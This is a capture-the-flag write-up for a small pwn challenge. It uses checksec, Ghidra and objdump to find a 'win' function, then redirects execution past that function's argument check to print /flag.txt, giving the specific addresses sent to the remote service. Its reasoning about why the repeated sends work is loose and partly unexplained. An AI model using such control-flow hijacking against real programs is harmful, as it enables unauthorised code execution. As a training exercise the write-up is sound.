# Challenge description

I liked playing Super Mario just for jumping from one place to another. Can you do that?

# Soluce

The challenge gives us an executable file: "chall". When we run it, it say:

```bash
i like to jump where ever you say 
```

We do do the command

```bash
checksec --file=chall
```

It gives us the following output:

```bash
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE
Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   68 Symbols        No    0               2               chall
```

We can see that the NX bit is enabled, so we can't execute shellcode. But there is no canary, so we can do a buffer overflow.

We will open this file with ghidra to see the code. When we open the file, we see the following code for main function:

```c
void main(void)

{
  code *local_10;
  
  printf("i like to jump where ever you say \ngive me the adress to go : ");
  __isoc99_scanf(&DAT_004020a8,&local_10);
                    /* WARNING: Could not recover jumptable at 0x00401293. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  (*local_10)();
  return;
}
```

We can see that the program is asking us for an adress to jump to. In ghidra, we can see that there is a win function. We do this command to get the adress of the win function:

```bash
objdump -D -M intel chall | grep "win"
```

It gives us the following output:

```bash
0000000000401182 <win>:
```

We will try to put this adress to the executable file. It gives us that:

```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ ./chall     
i like to jump where ever you say 
give me the adress to go : 0x401182
Bro where are the arguments ? 
```

So we will try to understand the win function to know what are the arguments.
The code of the win function is the following:

```c
void win(int param_1,int param_2,int param_3)

{
  char *pcVar1;
  char local_78 [104];
  FILE *local_10;
  
  if (((0xde < param_1) && (0xad < param_2)) && (0xc0de < param_3)) {
    local_10 = fopen("/flag.txt","r");
    if (local_10 == (FILE *)0x0) {
      puts("Failed to open file");
                    /* WARNING: Subroutine does not return */
      exit(1);
    }
    pcVar1 = fgets(local_78,100,local_10);
    if (pcVar1 == (char *)0x0) {
      puts("Failed to read line");
    }
    else {
      printf("flag is : %s",local_78);
    }
    fclose(local_10);
    return;
  }
  printf("Bro where are the arguments ?");
                    /* WARNING: Subroutine does not return */
  exit(0x45);
}
```

The win function is asking for 3 arguments. 
- The first one must be greater than 0xde
- The second one must be greater than 0xad
- The third one must be greater than 0xc0de

In x86_64, the arguments are passed in the following order: rdi, rsi, rdx. So we need to change control the value of these registers to pass the arguments to the win function.

In facts, we don't need to change the value of the registers, we just need to put the adress after the if statement. We will try to put the adress of the win function after the if statement.

We will try locally, it say that the "flag.txt" doesn't exist. So we will try in remote with the given netcat.

But when we try it just resend the adress.

We need to smash the stack by sending "0x401269" 12 times (adress of LEA in the main function). 

After that, we send "0x4011ba", it skip the if statement and display the flag.